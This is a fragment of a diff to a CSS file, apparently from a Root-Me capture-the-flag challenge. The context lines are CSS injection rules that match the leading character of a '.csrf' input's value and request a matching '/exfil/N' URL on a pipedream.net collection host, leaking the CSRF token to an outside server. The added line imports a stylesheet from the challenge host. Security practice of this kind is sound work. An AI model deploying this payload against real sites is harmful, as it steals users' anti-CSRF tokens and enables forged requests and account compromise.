@@ -60,4 +60,5 @@
 .csrf[value^=7] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/7); } 
 .csrf[value^=8] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/8); } 
 .csrf[value^=9] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil/9); } 
+@import url("http://challenge01.root-me.org:58005/?style=light");
     
